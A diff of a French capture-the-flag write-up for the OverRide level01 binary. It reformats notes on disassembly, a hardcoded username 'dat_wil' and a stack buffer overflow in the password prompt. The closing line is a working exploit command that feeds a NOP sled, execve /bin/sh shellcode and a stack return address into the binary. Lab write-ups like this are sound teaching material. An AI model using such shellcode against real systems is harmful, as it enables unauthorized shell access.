@@ -138,7 +138,7 @@ End of assembler dump.
    0x080484eb <+27>:    mov    %edx,%ecx
    0x080484ed <+29>:    rep stos %eax,%es:(%edi)
 ```
-- Remplis un buffer de 0x10 * 4 octets sur la pile avec 0x0.
+> Remplis un buffer de 0x10 * 4 octets sur la stack avec 0x0.
 
 ```
    0x08048510 <+64>:    mov    0x804a020,%eax
@@ -152,7 +152,7 @@ End of assembler dump.
 
 > `0x804a040 <a_user_name>: 0x00000000`
 
-- Prompt stdin pour 0x100 octets, stocke l'entrée dans la section bss, puis appele la fonction `<verify_user_name>`.
+> Prompt stdin pour 0x100 octets, stocke l'entrée dans la section bss, puis appele la fonction `<verify_user_name>`.
 
 ```
    0x08048478 <+20>:    mov    $0x804a040,%edx
@@ -174,7 +174,7 @@ End of assembler dump.
 ```
 > `0x80486a8: "dat_wil"`
 
-- Si l'entrée utilisateur est "dat_wil", retourne 0.
+> Si l'entrée utilisateur est 'dat_wil', retourne 0.
 
 ```
    0x08048532 <+98>:    mov    %eax,0x5c(%esp)
@@ -185,7 +185,7 @@ End of assembler dump.
    0x08048549 <+121>:   mov    $0x1,%eax
    0x0804854e <+126>:   jmp    0x80485af <main+223>
 ```
-- Si `<verify_user_name>` ne retourne pas 0, affiche un message et retourn 1.
+> Si `<verify_user_name>` ne retourne pas 0, affiche un message et retourn 1.
 ```
    0x0804855c <+140>:   mov    0x804a020,%eax
    0x08048561 <+145>:   mov    %eax,0x8(%esp)
@@ -198,7 +198,7 @@ End of assembler dump.
    0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
 
 ```
-- Prompt stdin pour 0x64 octets, stocke l'entrée dans un buffer de 0x40 octets déclaré sur la stack, puis appele la fonction `<verify_user_pass>`.
+> Prompt stdin pour 0x64 octets, stocke l'entrée dans un buffer de 0x40 octets déclaré sur la stack, puis appele la fonction `<verify_user_pass>`.
 ```
    0x08048585 <+181>:   mov    %eax,0x5c(%esp)
    0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
@@ -210,9 +210,7 @@ End of assembler dump.
    0x080485a3 <+211>:   mov    $0x1,%eax
    0x080485a8 <+216>:   jmp    0x80485af <main+223>
 ```
-- Du coup, peut importe ce qui se passe ensuite, le programme affiche un message d'erreur et on retourne 1. Mais étant donné qu'on prompt stdin pour 0x64 octets et qu'on stocke l'entrée dans un buffer de 0x40 octets, on peut overflow le buffer et écraser la valeur de retour de la fonction `<verify_user_pass>`.
-
-- Je reprends un shellcode de Rainfall:
+- Peut importe ce qui se passe ensuite, le programme affiche un message d'erreur et on retourne 1. Mais étant donné qu'on prompt stdin pour 0x64 octets et qu'on stocke l'entrée dans un buffer de 0x40 octets, on peut overflow le buffer et écraser la valeur de retour de la fonction `<verify_user_pass>`.
 
 ```
 level01@OverRide:~$ (echo dat_wil; python -c "print('\x90'*35 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*18 + '\xec\xd6\xff\xff')"; cat) | ./level01 
